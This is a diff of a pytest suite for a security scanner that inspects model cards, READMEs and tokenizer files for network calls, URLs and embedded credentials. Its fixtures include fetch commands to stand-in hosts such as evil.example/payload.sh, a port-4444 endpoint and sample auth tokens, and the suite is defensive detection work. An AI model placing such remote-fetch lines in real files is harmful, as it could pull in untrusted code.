+def test_text_scanner_model_card_keeps_distinct_executable_indicators_separate(tmp_path: Path) -> None:
+    text_path = tmp_path / "model_card.md"
+    text_path.write_text('requests.get("https://evil.example/payload")\n', encoding="utf-8")
+
+    result = TextScanner().scan(str(text_path))
+    aggregate = scan_model_directory_or_file(str(text_path), cache_enabled=False)
+
+    network_checks = _failed_network_detection_checks(result)
+    checks_by_type = {check.details["type"]: check for check in network_checks}
+    assert set(checks_by_type) == {"network_function", "url_detected"}
+    assert checks_by_type["network_function"].severity == IssueSeverity.CRITICAL
+    assert "evidence_fingerprint" not in checks_by_type["network_function"].details
+    assert checks_by_type["url_detected"].details["deduplicated_related_findings"] == [
+        {
+            "type": "domain_name",
+            "severity": "HIGH",
+            "message": "Domain name detected: evil.example",
+            "position": 22,
+            "domain": "evil.example",
+        }
+    ]
+    assert determine_exit_code(aggregate) == 1
+
+
+def test_text_scanner_model_card_dedup_preserves_distinct_locations_urls_and_severities(
+    tmp_path: Path,
+) -> None:
+    text_path = tmp_path / "model_card.md"
+    text_path.write_text(
+        "\n".join(
+            [
+                "Docs: https://evil.example/cmd.sh",
+                'endpoint = "https://evil.example/cmd.sh"',
+                "Mirror: https://evil.example/other.sh",
+            ]
+        )
+        + "\n",
+        encoding="utf-8",
+    )
+
+    result = TextScanner().scan(str(text_path))
+
+    network_checks = [
+        check
+        for check in _failed_network_detection_checks(result)
+        if check.details.get("normalized_evidence", {}).get("kind") == "url"
+    ]
+    records = [
+        (
+            check.details["line"],
+            check.details["normalized_evidence"]["value"],
+            check.severity,
+            check.details["severity"],
+        )
+        for check in network_checks
+    ]
+
+    assert records == [
+        (1, "https://evil.example/cmd.sh", IssueSeverity.INFO, "INFO"),
+        (2, "https://evil.example/cmd.sh", IssueSeverity.CRITICAL, "HIGH"),
+        (3, "https://evil.example/other.sh", IssueSeverity.INFO, "INFO"),
+    ]
+    assert len({check.details["evidence_fingerprint"] for check in network_checks}) == 3
+
+
+def test_text_scanner_model_card_dedup_keeps_suspicious_ports_separate(tmp_path: Path) -> None:
+    text_path = tmp_path / "model_card.md"
+    text_path.write_text('endpoint = "https://evil.example:4444/cmd.sh"\n', encoding="utf-8")
+
+    result = TextScanner().scan(str(text_path))
+    aggregate = scan_model_directory_or_file(str(text_path), cache_enabled=False)
+
+    network_checks = _failed_network_detection_checks(result)
+    checks_by_type = {check.details["type"]: check for check in network_checks}
+
+    assert set(checks_by_type) == {"suspicious_port", "url_detected"}
+    assert checks_by_type["suspicious_port"].details["port"] == 4444
+    assert "evidence_fingerprint" not in checks_by_type["suspicious_port"].details
+    assert checks_by_type["url_detected"].details["normalized_evidence"] == {
+        "kind": "url",
+        "value": "https://evil.example:4444/cmd.sh",
+    }
+    assert determine_exit_code(aggregate) == 1
+
+
+def test_text_scanner_model_card_dedup_redacts_credentials_without_merging_locations(
+    tmp_path: Path,
+) -> None:
+    text_path = tmp_path / "model_card.md"
+    text_path.write_text(
+        "git clone https://user:first-secret@evil.example/repo.git\n"
+        "git clone https://user:second-secret@evil.example/repo.git\n",
+        encoding="utf-8",
+    )
+
+    result = TextScanner().scan(str(text_path))
+    aggregate = scan_model_directory_or_file(str(text_path), cache_enabled=False)
+    serialized = json.dumps(aggregate.model_dump(mode="json"), sort_keys=True)
+
+    network_checks = _failed_network_detection_checks(result)
+
+    assert len(network_checks) == 2
+    assert {check.details["line"] for check in network_checks} == {1, 2}
+    assert len({check.details["evidence_fingerprint"] for check in network_checks}) == 2
+    assert all(
+        check.details["normalized_evidence"]
+        == {
+            "kind": "url",
+            "value": "https://evil.example/repo.git",
+        }
+        for check in network_checks
+    )
+    assert "first-secret" not in serialized
+    assert "second-secret" not in serialized
+    assert determine_exit_code(aggregate) == 1
+
+
+def test_text_scanner_model_card_dedup_keeps_encoded_url_variants_distinct(tmp_path: Path) -> None:
+    text_path = tmp_path / "model_card.md"
+    text_path.write_text(
+        "Docs: https://evil.example/payload.sh\n"
+        "Docs: https://evil.example/%70ayload.sh\n"
+        "Docs: https://xn--exmple-cua.com/payload.sh\n",
+        encoding="utf-8",
+    )
+
+    result = TextScanner().scan(str(text_path))
+
+    network_checks = [
+        check
+        for check in _failed_network_detection_checks(result)
+        if check.details.get("normalized_evidence", {}).get("kind") == "url"
+    ]
+
+    assert [check.details["normalized_evidence"]["value"] for check in network_checks] == [
+        "https://evil.example/payload.sh",
+        "https://evil.example/%70ayload.sh",
+        "https://xn--exmple-cua.com/payload.sh",
+    ]
+    assert len({check.details["evidence_fingerprint"] for check in network_checks}) == 3
+
+
+def test_text_scanner_model_card_dedup_keeps_encoded_nested_urls_distinct(tmp_path: Path) -> None:
+    text_path = tmp_path / "model_card.md"
+    text_path.write_text(
+        'endpoint = "https://bucket.s3.amazonaws.com/model.bin?next=https%3A%2F%2Fevil.example%2Fcmd.sh"\n',
+        encoding="utf-8",
+    )
+
+    result = TextScanner().scan(str(text_path))
+    aggregate = scan_model_directory_or_file(str(text_path), cache_enabled=False)
+
+    network_checks = [
+        check
+        for check in _failed_network_detection_checks(result)
+        if check.details.get("normalized_evidence", {}).get("kind") == "url"
+    ]
+    evidence_values = [check.details["normalized_evidence"]["value"] for check in network_checks]
+
+    assert evidence_values == [
+        "https://evil.example/cmd.sh",
+        "https://bucket.s3.amazonaws.com/model.bin",
+    ]
+    assert {check.details["type"] for check in network_checks} == {"cloud_storage_url", "url_detected"}
+    assert all(check.severity == IssueSeverity.CRITICAL for check in network_checks)
+    assert len({check.details["evidence_fingerprint"] for check in network_checks}) == 2
+    assert determine_exit_code(aggregate) == 1
+
+
+def test_text_scanner_model_card_dedup_keeps_code_block_controls_separate(tmp_path: Path) -> None:
+    text_path = tmp_path / "model_card.md"
+    text_path.write_text(
+        "```sh\n"
+        "git clone https://evil.example/repo.git\n"
+        "python -c 'import requests; requests.get(\"https://evil.example/cmd.sh\")'\n"
+        "```\n",
+        encoding="utf-8",
+    )
+
+    result = TextScanner().scan(str(text_path))
+    aggregate = scan_model_directory_or_file(str(text_path), cache_enabled=False)
+
+    network_checks = _failed_network_detection_checks(result)
+    checks_by_type = {check.details["type"]: check for check in network_checks}
+
+    assert set(checks_by_type) == {"network_command", "network_function", "network_library", "url_detected"}
+    assert checks_by_type["network_command"].details["command_type"] == "git_clone"
+    assert checks_by_type["network_function"].details["function"] == "requests.get"
+    assert checks_by_type["network_library"].details["library"] == "requests"
+    assert "evidence_fingerprint" not in checks_by_type["network_library"].details
+    assert checks_by_type["url_detected"].details["normalized_evidence"] == {
+        "kind": "url",
+        "value": "https://evil.example/cmd.sh",
+    }
+    assert determine_exit_code(aggregate) == 1
+
+
+def test_text_scanner_model_card_markdown_link_string_endpoint_remains_actionable(tmp_path: Path) -> None:
+    text_path = tmp_path / "model_card.md"
+    text_path.write_text(
+        'endpoint = "[download](https://evil.example/payload.sh)"\n',
+        encoding="utf-8",
+    )
+
+    result = TextScanner().scan(str(text_path))
+    aggregate = scan_model_directory_or_file(str(text_path), cache_enabled=False)
+
+    network_checks = _failed_network_detection_checks(result)
+
+    assert any(
+        check.details.get("normalized_evidence")
+        == {
+            "kind": "url",
+            "value": "https://evil.example/payload.sh",
+        }
+        for check in network_checks
+    )
+    assert determine_exit_code(aggregate) == 1
+
+
+def test_text_scanner_model_card_markdown_link_return_remains_actionable(tmp_path: Path) -> None:
+    text_path = tmp_path / "model_card.md"
+    text_path.write_text(
+        'def endpoint():\n    return "[download](https://evil.example/payload.sh)"\n',
+        encoding="utf-8",
+    )
+
+    result = TextScanner().scan(str(text_path))
+    aggregate = scan_model_directory_or_file(str(text_path), cache_enabled=False)
+
+    network_checks = _failed_network_detection_checks(result)
+
+    assert any(
+        check.details.get("normalized_evidence")
+        == {
+            "kind": "url",
+            "value": "https://evil.example/payload.sh",
+        }
+        for check in network_checks
+    )
+    assert determine_exit_code(aggregate) == 1
+
+
+def test_text_scanner_model_card_parenthesized_markdown_link_return_remains_actionable(tmp_path: Path) -> None:
+    text_path = tmp_path / "model_card.md"
+    text_path.write_text(
+        'def endpoint():\n    return ("[download](https://evil.example/payload.sh)")\n',
+        encoding="utf-8",
+    )
+
+    result = TextScanner().scan(str(text_path))
+    aggregate = scan_model_directory_or_file(str(text_path), cache_enabled=False)
+
+    network_checks = _failed_network_detection_checks(result)
+
+    assert any(
+        check.details.get("normalized_evidence")
+        == {
+            "kind": "url",
+            "value": "https://evil.example/payload.sh",
+        }
+        for check in network_checks
+    )
+    assert determine_exit_code(aggregate) == 1
+
+
+def test_text_scanner_model_card_multiline_markdown_link_return_remains_actionable(tmp_path: Path) -> None:
+    text_path = tmp_path / "model_card.md"
+    text_path.write_text(
+        'def endpoint():\n    return (\n        "[download](https://evil.example/payload.sh)"\n    )\n',
+        encoding="utf-8",
+    )
+
+    result = TextScanner().scan(str(text_path))
+    aggregate = scan_model_directory_or_file(str(text_path), cache_enabled=False)
+
+    network_checks = _failed_network_detection_checks(result)
+
+    assert any(
+        check.details.get("normalized_evidence")
+        == {
+            "kind": "url",
+            "value": "https://evil.example/payload.sh",
+        }
+        for check in network_checks
+    )
+    assert determine_exit_code(aggregate) == 1
+
+
+def test_text_scanner_model_card_wrapped_call_markdown_link_remains_actionable(tmp_path: Path) -> None:
+    text_path = tmp_path / "model_card.md"
+    text_path.write_text(
+        'download(\n    "[download](https://evil.example/payload.sh)"\n)\n',
+        encoding="utf-8",
+    )
+
+    result = TextScanner().scan(str(text_path))
+    aggregate = scan_model_directory_or_file(str(text_path), cache_enabled=False)
+
+    network_checks = _failed_network_detection_checks(result)
+
+    assert any(
+        check.details.get("normalized_evidence")
+        == {
+            "kind": "url",
+            "value": "https://evil.example/payload.sh",
+        }
+        for check in network_checks
+    )
+    assert determine_exit_code(aggregate) == 1
+
+
+@pytest.mark.parametrize(
+    "content",
+    [
+        'download(\n"https://evil.example/payload.sh"\n)\n',
+        'download(\n"padding",\n"https://evil.example/payload.sh"\n)\n',
+    ],
+)
+def test_text_scanner_model_card_zero_indent_wrapped_call_url_remains_actionable(tmp_path: Path, content: str) -> None:
+    text_path = tmp_path / "model_card.md"
+    text_path.write_text(
+        content,
+        encoding="utf-8",
+    )
+
+    result = TextScanner().scan(str(text_path))
+    aggregate = scan_model_directory_or_file(str(text_path), cache_enabled=False)
+
+    network_checks = _failed_network_detection_checks(result)
+
+    assert any(
+        check.details.get("normalized_evidence")
+        == {
+            "kind": "url",
+            "value": "https://evil.example/payload.sh",
+        }
+        and check.severity in {IssueSeverity.WARNING, IssueSeverity.CRITICAL}
+        for check in network_checks
+    )
+    assert determine_exit_code(aggregate) == 1
+
+
+@pytest.mark.parametrize(
+    "content",
+    [
+        'download:\n"https://docs.example.com/reference"\n',
+        "download(\n# docs: https://docs.example.com/reference\n)\n",
+        "| Helper | Reference |\n| --- | --- |\n| `download(` | https://docs.example.com/reference |\n",
+        "| Helper | Reference |\n| --- | --- |\n| download( | https://docs.example.com/reference |\n",
+        (
+            "| Helper | Reference |\n"
+            "| --- | --- |\n"
+            "| `download(` | passive literal |\n"
+            "| Docs | https://docs.example.com/reference |\n"
+        ),
+        (
+            "| Helper | Reference |\n"
+            "| --- | --- |\n"
+            "| download( | passive literal |\n"
+            "| Docs | https://docs.example.com/reference |\n"
+        ),
+    ],
+)
+def test_text_scanner_model_card_passive_download_near_match_urls_stay_informational(
+    tmp_path: Path,
+    content: str,
+) -> None:
+    text_path = tmp_path / "model_card.md"
+    text_path.write_text(
+        content,
+        encoding="utf-8",
+    )
+
+    result = TextScanner().scan(str(text_path))
+    aggregate = scan_model_directory_or_file(str(text_path), cache_enabled=False)
+
+    network_checks = _failed_network_detection_checks(result)
+
+    assert network_checks
+    assert all(check.severity == IssueSeverity.INFO for check in network_checks)
+    assert determine_exit_code(aggregate) == 0
+
+
+@pytest.mark.parametrize(
+    "payload",
+    [
+        b'download(\n"https://evil.example/payload.sh"\n)\n',
+        b'download(\n"padding",\n"https://evil.example/payload.sh"\n)\n',
+    ],
+)
+def test_text_scanner_documentation_open_call_detects_zero_indent_wrapped_url(payload: bytes) -> None:
+    position = payload.index(b"https://")
+
+    assert TextScanner._documentation_open_call_contains_position(payload, position)
+
+
+@pytest.mark.parametrize(
+    "payload",
+    [
+        b'download:\n"https://docs.example.com/reference"\n',
+        b"download(\n# docs: https://docs.example.com/reference\n)\n",
+        (
+            b"| Helper | Reference |\n"
+            b"| --- | --- |\n"
+            b"| `download(` | passive literal |\n"
+            b"| Docs | https://docs.example.com/reference |\n"
+        ),
+        (
+            b"| Helper | Reference |\n"
+            b"| --- | --- |\n"
+            b"| download( | passive literal |\n"
+            b"| Docs | https://docs.example.com/reference |\n"
+        ),
+    ],
+)
+def test_text_scanner_documentation_open_call_ignores_zero_indent_passive_near_matches(payload: bytes) -> None:
+    position = payload.index(b"https://")
+
+    assert not TextScanner._documentation_open_call_contains_position(payload, position)
+
+
+@pytest.mark.parametrize(
+    "prefix",
+    [
+        b"`download(` ",
+        b"| `download(` | ",
+        b"| download( | ",
+    ],
+)
+def test_text_scanner_documentation_enclosing_call_ignores_markdown_table_call_literals(prefix: bytes) -> None:
+    assert not TextScanner._documentation_prefix_has_enclosing_call(prefix)
+
+
+@pytest.mark.parametrize(
+    "content",
+    [
+        'payloads = {"doc": "[download](https://evil.example/payload.sh)"}\n',
+        'payloads = {"#doc": "[download](https://evil.example/payload.sh)"}\n',
+        'payloads = {"note": "#", "doc": "[download](https://evil.example/payload.sh)"}\n',
+        'payloads = {\n    "doc": "[download](https://evil.example/payload.sh)"\n}\n',
+        'payloads = {\n"doc": "[download](https://evil.example/payload.sh)"\n}\n',
+        'payloads = {  # endpoint payloads\n    "doc": "[download](https://evil.example/payload.sh)"\n}\n',
+    ],
+)
+def test_text_scanner_model_card_dict_markdown_link_remains_actionable(
+    tmp_path: Path,
+    content: str,
+) -> None:
+    text_path = tmp_path / "model_card.md"
+    text_path.write_text(content, encoding="utf-8")
+
+    result = TextScanner().scan(str(text_path))
+    aggregate = scan_model_directory_or_file(str(text_path), cache_enabled=False)
+
+    network_checks = _failed_network_detection_checks(result)
+
+    assert any(
+        check.details.get("normalized_evidence")
+        == {
+            "kind": "url",
+            "value": "https://evil.example/payload.sh",
+        }
+        for check in network_checks
+    )
+    assert determine_exit_code(aggregate) == 1
+
+
+@pytest.mark.parametrize(
+    "content",
+    [
+        "payloads = {\n[API docs](https://docs.example.com/reference)\n}\n",
+        "payloads = {\n- [API docs](https://docs.example.com/reference)\n}\n",
+        "payloads = {\n1. [API docs](https://docs.example.com/reference)\n}\n",
+        "payloads = {\n+ [API docs](https://docs.example.com/reference)\n}\n",
+        "payloads = {\n### [API docs](https://docs.example.com/reference)\n}\n",
+        "payloads = {\n# [API docs](https://docs.example.com/reference)\n}\n",
+    ],
+)
+def test_text_scanner_model_card_zero_indent_markdown_links_after_literal_opener_stay_informational(
+    tmp_path: Path,
+    content: str,
+) -> None:
+    text_path = tmp_path / "model_card.md"
+    text_path.write_text(
+        content,
+        encoding="utf-8",
+    )
+
+    result = TextScanner().scan(str(text_path))
+    aggregate = scan_model_directory_or_file(str(text_path), cache_enabled=False)
+
+    network_checks = _failed_network_detection_checks(result)
+
+    assert network_checks
+    assert all(check.severity == IssueSeverity.INFO for check in network_checks)
+    assert determine_exit_code(aggregate) == 0
+
+
+def test_text_scanner_model_card_crlf_dict_markdown_link_remains_actionable(tmp_path: Path) -> None:
+    text_path = tmp_path / "model_card.md"
+    text_path.write_bytes(b'payloads = {\r\n    "doc": "[download](https://evil.example/payload.sh)"\r\n}\r\n')
+
+    result = TextScanner().scan(str(text_path))
+    aggregate = scan_model_directory_or_file(str(text_path), cache_enabled=False)
+
+    network_checks = _failed_network_detection_checks(result)
+
+    assert any(
+        check.details.get("normalized_evidence")
+        == {
+            "kind": "url",
+            "value": "https://evil.example/payload.sh",
+        }
+        and check.severity in {IssueSeverity.WARNING, IssueSeverity.CRITICAL}
+        for check in network_checks
+    )
+    assert determine_exit_code(aggregate) == 1
+
+
+def test_text_scanner_model_card_comment_markdown_link_stays_informational(tmp_path: Path) -> None:
+    text_path = tmp_path / "model_card.md"
+    text_path.write_text(
+        'payloads = {}  # "[download](https://evil.example/payload.sh)"\n',
+        encoding="utf-8",
+    )
+
+    result = TextScanner().scan(str(text_path))
+    aggregate = scan_model_directory_or_file(str(text_path), cache_enabled=False)
+
+    network_checks = _failed_network_detection_checks(result)
+
+    assert network_checks
+    assert all(check.severity == IssueSeverity.INFO for check in network_checks)
+    assert determine_exit_code(aggregate) == 0
+
+
+def test_text_scanner_model_card_bibliography_url_field_is_informational(tmp_path: Path) -> None:
+    text_path = tmp_path / "model_card.md"
+    text_path.write_text(
+        "@misc{whisper,\n"
+        "  title = {Whisper},\n"
+        "  url = {https://arxiv.org/abs/2212.04356},\n"
+        "  copyright = {arXiv.org perpetual, non-exclusive license},\n"
+        "}\n",
+        encoding="utf-8",
+    )
+
+    result = TextScanner().scan(str(text_path))
+    aggregate = scan_model_directory_or_file(str(text_path), cache_enabled=False)
+
+    network_checks = [
+        check
+        for check in result.checks
+        if check.name == "Network Communication Detection" and check.status == CheckStatus.FAILED
+    ]
+
+    assert network_checks
+    assert all(check.severity == IssueSeverity.INFO for check in network_checks)
+    assert determine_exit_code(aggregate) == 0
+
+
+def test_text_scanner_model_card_single_line_bibliography_url_field_is_informational(tmp_path: Path) -> None:
+    text_path = tmp_path / "model_card.md"
+    text_path.write_text(
+        "@misc{whisper, title = {Whisper}, url = {https://arxiv.org/abs/2212.04356}}\n",
+        encoding="utf-8",
+    )
+
+    result = TextScanner().scan(str(text_path))
+    aggregate = scan_model_directory_or_file(str(text_path), cache_enabled=False)
+
+    network_checks = [
+        check
+        for check in result.checks
+        if check.name == "Network Communication Detection" and check.status == CheckStatus.FAILED
+    ]
+
+    assert network_checks
+    assert all(check.severity == IssueSeverity.INFO for check in network_checks)
+    assert determine_exit_code(aggregate) == 0
+
+
+def test_text_scanner_model_card_quoted_bibliography_url_field_is_informational(tmp_path: Path) -> None:
+    text_path = tmp_path / "model_card.md"
+    text_path.write_text(
+        '@misc{whisper,\n  title = {Whisper},\n  url = "https://arxiv.org/abs/2212.04356",\n}\n',
+        encoding="utf-8",
+    )
+
+    result = TextScanner().scan(str(text_path))
+    aggregate = scan_model_directory_or_file(str(text_path), cache_enabled=False)
+
+    network_checks = [
+        check
+        for check in result.checks
+        if check.name == "Network Communication Detection" and check.status == CheckStatus.FAILED
+    ]
+
+    assert network_checks
+    assert all(check.severity == IssueSeverity.INFO for check in network_checks)
+    assert determine_exit_code(aggregate) == 0
+
+
+def test_text_scanner_model_card_markdown_table_links_with_parenthetical_text_are_informational(
+    tmp_path: Path,
+) -> None:
+    text_path = tmp_path / "model_card.md"
+    text_path.write_text(
+        "| Dataset | Paper |\n"
+        "| --- | --- |\n"
+        "| AllNLI ([SNLI](https://nlp.stanford.edu/projects/snli/) and "
+        "[MultiNLI](https://cims.nyu.edu/~sbowman/multinli/)) | "
+        "[paper](https://doi.org/10.18653/v1/d15-1075) |\n",
+        encoding="utf-8",
+    )
+
+    result = TextScanner().scan(str(text_path))
+    aggregate = scan_model_directory_or_file(str(text_path), cache_enabled=False)
+
+    network_checks = [
+        check
+        for check in result.checks
+        if check.name == "Network Communication Detection" and check.status == CheckStatus.FAILED
+    ]
+
+    assert network_checks
+    assert all(check.severity == IssueSeverity.INFO for check in network_checks)
+    assert determine_exit_code(aggregate) == 0
+
+
+def test_text_scanner_model_card_unclosed_bibliography_does_not_suppress_endpoint_code(
+    tmp_path: Path,
+) -> None:
+    text_path = tmp_path / "model_card.md"
+    text_path.write_text(
+        '@misc{paper,\n  title = {Reference}\nendpoint = "https://evil.example/payload.sh"\n',
+        encoding="utf-8",
+    )
+
+    result = TextScanner().scan(str(text_path))
+    aggregate = scan_model_directory_or_file(str(text_path), cache_enabled=False)
+
+    network_checks = _failed_network_detection_checks(result)
+
+    assert any(
+        check.details.get("normalized_evidence")
+        == {
+            "kind": "url",
+            "value": "https://evil.example/payload.sh",
+        }
+        for check in network_checks
+    )
+    assert determine_exit_code(aggregate) == 1
+
+
+def test_text_scanner_model_card_unclosed_bibliography_does_not_suppress_quoted_url_code(
+    tmp_path: Path,
+) -> None:
+    text_path = tmp_path / "model_card.md"
+    text_path.write_text(
+        '@misc{paper,\n  title = {Reference}\nurl = "https://evil.example/payload.sh"\n',
+        encoding="utf-8",
+    )
+
+    result = TextScanner().scan(str(text_path))
+    aggregate = scan_model_directory_or_file(str(text_path), cache_enabled=False)
+
+    network_checks = _failed_network_detection_checks(result)
+
+    assert any(
+        check.details.get("normalized_evidence")
+        == {
+            "kind": "url",
+            "value": "https://evil.example/payload.sh",
+        }
+        for check in network_checks
+    )
+    assert determine_exit_code(aggregate) == 1
+
+
+def test_text_scanner_model_card_dedup_bounds_repeated_documentation_links(tmp_path: Path) -> None:
+    text_path = tmp_path / "model_card.md"
+    lines = [f"Reference {index}: https://docs.example.com/reference" for index in range(96)]
+    text_path.write_text("\n".join(lines) + "\n", encoding="utf-8")
+
+    result = TextScanner().scan(str(text_path))
+
+    network_checks = _failed_network_detection_checks(result)
+
+    assert len(network_checks) == len(lines)
+    assert all(check.severity == IssueSeverity.INFO for check in network_checks)
+    assert len({check.details["evidence_fingerprint"] for check in network_checks}) == len(lines)
+    assert not result.metadata.get("analysis_incomplete")
 
 
 @pytest.mark.parametrize(
@@ -3352,6 +1794,8 @@ def test_text_scanner_fenced_untrusted_network_commands_remain_actionable(
         "[Documentation](https://example.com/reference)\n",
         "![Model diagram](https://example.com/model.png)\n",
         "> - [Documentation](https://example.com/reference)\n",
+        "| [SNLI](https://nlp.stanford.edu/projects/snli/) | [paper](https://doi.org/10.18653/v1/d15-1075) |\n",
+        "| [Natural Questions (NQ)](https://ai.google.com/research/NaturalQuestions) | 100,231 |\n",
         'def load():\n    """See https://docs.example.com/reference."""\n',
         "The result = https://example.com/reference in this example.\n",
         'The result = "https://example.com/reference" in this example.\n',
@@ -3868,29 +2312,6 @@ def test_text_scanner_earlier_network_library_call_is_not_hidden_by_later_prose(
         check.name == "Network Communication Detection"
         and check.details.get("type") == "network_library"
         and check.details.get("pattern") == "requests.request"
-        and check.severity in {IssueSeverity.WARNING, IssueSeverity.CRITICAL}
-        for check in result.checks
-    )
-    assert determine_exit_code(aggregate) == 1
-
-
-@pytest.mark.parametrize("filename", ["README.rst", "README", "README.txt"])
-def test_text_scanner_rst_headings_do_not_hide_active_network_call(tmp_path: Path, filename: str) -> None:
-    text_path = tmp_path / filename
-    text_path.write_text(
-        """Heading
-~~~~~~~
-requests.get("https://evil.example/payload")
-~~~~~~~
-""",
-        encoding="utf-8",
-    )
-
-    result = TextScanner().scan(str(text_path))
-    aggregate = scan_model_directory_or_file(str(text_path), cache_enabled=False)
-
-    assert any(
-        check.name == "Network Communication Detection"
         and check.severity in {IssueSeverity.WARNING, IssueSeverity.CRITICAL}
         for check in result.checks
     )
@@ -5297,6 +3718,141 @@ def test_text_scanner_bare_active_vocabulary_tokens_are_informational(
     assert determine_exit_code(aggregate) == 0
 
 
+@pytest.mark.parametrize(
+    "credential",
+    [
+        "Basic configuration",
+        "Bearer configuration",
+        "Basic Y29uZmlndXJhdGlvbg==",
+    ],
+)
+def test_text_scanner_bare_merges_auth_token_pairs_are_informational(
+    tmp_path: Path,
+    credential: str,
+) -> None:
+    text_dir = tmp_path / "text_tokenizer"
+    text_dir.mkdir()
+    text_path = text_dir / "merges.txt"
+    text_path.write_text(f"#version: 0.2\nsafe token\n{credential}\n", encoding="utf-8")
+
+    result = TextScanner().scan(str(text_path))
+    aggregate = scan_model_directory_or_file(str(text_path), cache_enabled=False)
+
+    secret_checks = [
+        check
+        for check in result.checks
+        if check.name == "Embedded Secrets Detection" and check.status == CheckStatus.FAILED
+    ]
+    assert not secret_checks
+    assert determine_exit_code(aggregate) == 0
+
+
+@pytest.mark.parametrize(
+    ("credential", "secret_type"),
+    [
+        ("Basic QWxhZGRpbjpvcGVuIHNlc2FtZQ==", "Basic Auth Credentials"),
+        ("Bearer hf_abcdefghijklmnopqrstuvwxyz0123456789+/==", "Bearer Token"),
+    ],
+)
+def test_text_scanner_merges_whole_line_basic_bearer_credentials_remain_actionable_in_directory_scan(
+    tmp_path: Path,
+    credential: str,
+    secret_type: str,
+) -> None:
+    text_dir = tmp_path / "text_tokenizer"
+    text_dir.mkdir()
+    text_path = text_dir / "merges.txt"
+    text_path.write_text(f"#version: 0.2\nsafe token\n{credential}\n", encoding="utf-8")
+
+    result = TextScanner().scan(str(text_path))
+    aggregate = scan_model_directory_or_file(str(text_dir), cache_enabled=False)
+
+    assert any(
+        check.name == "Embedded Secrets Detection"
+        and check.status == CheckStatus.FAILED
+        and check.details.get("secret_type") == secret_type
+        and check.severity in {IssueSeverity.WARNING, IssueSeverity.CRITICAL}
+        for check in result.checks
+    )
+    assert determine_exit_code(aggregate) == 1
+    assert any(
+        check.name == "Embedded Secrets Detection"
+        and check.status == CheckStatus.FAILED
+        and check.location is not None
+        and check.location.startswith(str(text_path))
+        and check.details.get("secret_type") == secret_type
+        and check.severity in {IssueSeverity.WARNING, IssueSeverity.CRITICAL}
+        for check in aggregate.checks
+    )
+
+
+def test_text_scanner_merges_passive_basic_auth_respects_finding_limit(tmp_path: Path) -> None:
+    text_dir = tmp_path / "text_tokenizer"
+    text_dir.mkdir()
+    text_path = text_dir / "merges.txt"
+    tokens = ["dTA6cA==", "dTE6cA==", "dTI6cA==", "dTM6cA==", "dTQ6cA=="]
+    text_path.write_text("\n".join(f"Basic {token}" for token in tokens) + "\n", encoding="utf-8")
+
+    result = TextScanner(
+        config={
+            "check_network_comm": False,
+            "text_content_max_findings": 1,
+            "cache_enabled": False,
+        }
+    ).scan(str(text_path))
+    aggregate = scan_model_directory_or_file(
+        str(text_path),
+        cache_enabled=False,
+        check_network_comm=False,
+        text_content_max_findings=1,
+    )
+
+    failed_secret_checks = [
+        check
+        for check in result.checks
+        if check.name == "Embedded Secrets Detection"
+        and check.status == CheckStatus.FAILED
+        and check.details.get("secret_type") == "Basic Auth Credentials"
+    ]
+    assert len(failed_secret_checks) == 1
+    assert failed_secret_checks[0].details.get("passive_data_sidecar") is True
+    assert failed_secret_checks[0].details.get("redacted_value") == "Basic <redacted>"
+    assert result.success is False
+    assert result.metadata.get("scan_outcome") == INCONCLUSIVE_SCAN_OUTCOME
+    assert result.metadata.get("operational_error_reason") == "text_content_security_finding_limit"
+    assert determine_exit_code(aggregate) == 2
+    assert any(
+        check.name == "Text Content Security Coverage"
+        and check.status == CheckStatus.FAILED
+        and check.details.get("detector") == "secrets"
+        and check.details.get("max_findings") == 1
+        and check.details.get("analysis_incomplete") is True
+        and check.details.get("scan_outcome_reason") == "text_content_security_finding_limit"
+        for check in result.checks
+    )
+    serialized = result.to_json()
+    for raw_value in ("u0:p", "u1:p", "u2:p", "u3:p", "u4:p", *tokens):
+        assert raw_value not in serialized
+
+
+def test_text_scanner_merges_basic_assignments_remain_actionable(tmp_path: Path) -> None:
+    text_dir = tmp_path / "text_tokenizer"
+    text_dir.mkdir()
+    text_path = text_dir / "merges.txt"
+    text_path.write_text("authorization=Basic QWxhZGRpbjpvcGVuIHNlc2FtZQ==\n", encoding="utf-8")
+
+    result = TextScanner().scan(str(text_path))
+    aggregate = scan_model_directory_or_file(str(text_path), cache_enabled=False)
+
+    assert any(
+        check.name == "Embedded Secrets Detection"
+        and check.status == CheckStatus.FAILED
+        and check.severity in {IssueSeverity.WARNING, IssueSeverity.CRITICAL}
+        for check in result.checks
+    )
+    assert determine_exit_code(aggregate) == 1
+
+
 @pytest.mark.parametrize("token", ["trojan", "zombie"])
 def test_text_scanner_tokenizer_vocab_later_same_pattern_instruction_remains_actionable(
     tmp_path: Path,
@@ -5707,7 +4263,7 @@ def test_text_scanner_network_finding_limit_fails_closed_and_preserves_high_sign
     )
 
 
-def test_text_scanner_documentation_network_limit_is_informational(tmp_path: Path) -> None:
+def test_text_scanner_documentation_network_limit_fails_closed(tmp_path: Path) -> None:
     text_path = tmp_path / "README.md"
     text_path.write_text("https://docs.example.com/reference\n" * 10, encoding="utf-8")
 
@@ -5718,62 +4274,16 @@ def test_text_scanner_documentation_network_limit_is_informational(tmp_path: Pat
         }
     ).scan(str(text_path))
 
-    assert result.success is True
-    assert result.metadata.get("scan_outcome") != INCONCLUSIVE_SCAN_OUTCOME
+    assert result.success is False
+    assert result.metadata.get("scan_outcome") == INCONCLUSIVE_SCAN_OUTCOME
+    assert result.metadata.get("operational_error_reason") == "text_content_security_finding_limit"
     assert any(
-        check.name == "Network Communication Reporting Limit"
+        check.name == "Text Content Security Coverage"
         and check.severity == IssueSeverity.INFO
         and check.details.get("truncated_finding_type") == "url_detected"
-        and check.details.get("analysis_incomplete") is False
-        and check.details.get("reporting_incomplete") is True
+        and check.details.get("analysis_incomplete") is True
+        and check.details.get("scan_outcome_reason") == "text_content_security_finding_limit"
         for check in result.checks
-    )
-
-
-def test_text_scanner_documentation_default_network_cap_avoids_redaction_exhaustion(
-    tmp_path: Path,
-) -> None:
-    text_path = tmp_path / "README.md"
-    text_path.write_text(
-        "Authentication token examples are discussed in the docs.\n"
-        + "".join(f"https://docs.example.com/reference/{index}\n" for index in range(40)),
-        encoding="utf-8",
-    )
-
-    result = TextScanner(config={"check_secrets": False}).scan(str(text_path))
-
-    assert result.success is True
-    assert result.metadata.get("scan_outcome") != INCONCLUSIVE_SCAN_OUTCOME
-    assert any(
-        check.name == "Network Communication Reporting Limit"
-        and check.severity == IssueSeverity.INFO
-        and check.details.get("truncated_finding_type") == "url_detected"
-        and check.details.get("analysis_incomplete") is False
-        and check.details.get("reporting_incomplete") is True
-        for check in result.checks
-    )
-    assert not any(
